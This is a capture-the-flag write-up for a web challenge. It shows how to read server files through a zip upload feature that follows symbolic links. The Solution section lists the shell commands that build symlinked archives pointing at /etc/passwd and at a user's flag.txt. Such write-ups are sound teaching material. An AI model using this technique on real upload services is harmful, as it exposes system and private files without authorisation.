# Schrödinger
Challenge category: Web</br>
Description </br>
```
Hey, my digital cat managed to get into my server and I can't get him out.

The only thing running on the server is a website a colleague of mine made.

Can you find a way to use the website to check if my cat's okay? He'll likely be in the user's home directory.

You'll know he's fine if you find a "flag.txt" file.
```
## Overview
Basically we are prompted in front of a simple web page that asks you to upload a *ZIP* file then it will display its content

![webpage](./images/webpage.png)

We can already guess what's the vulnerability here, and more specifically the scenario is about [Zip File Automatically decompressed Upload](https://book.hacktricks.xyz/pentesting-web/file-upload#zip-tar-file-automatically-decompressed-upload)

To briefly describe the steps
1. Create a symbolic link to the target file (i.e /etc/passwd)
2. Create a Zip Archive that contains that symlink
3. Upload and read the content of the dereferenced symlink

The only thing here is to figure out where the flag is located, we can read */etc/passwd* in order to get the user running on the machine and then guess the flag location as /home/[user]/flag.txt

## Solution
Create a zip to read /etc/passwd as explained before
```
ln -s /etc/passwd test
zip --symlinks test.zip test
```
![etcpasswd](./images/passwd.png)

The user is *copenhagen* (the only one with /bin/sh) and now we can proceed to read /home/copenhagen/flag.txt 
```
mkdir /home/copenhagen
touch /home/copenhagen/flag.txt
ln -s /home/copenhagen/flag.txt flag
zip --symlinks test.zip flag
```
and here's the flag

![flag](./images/flag.png)

I've also included the python [source](./src/server.py) for the application, still dumped with the symlink vulnerability, but index.html and file_upload.html are not included 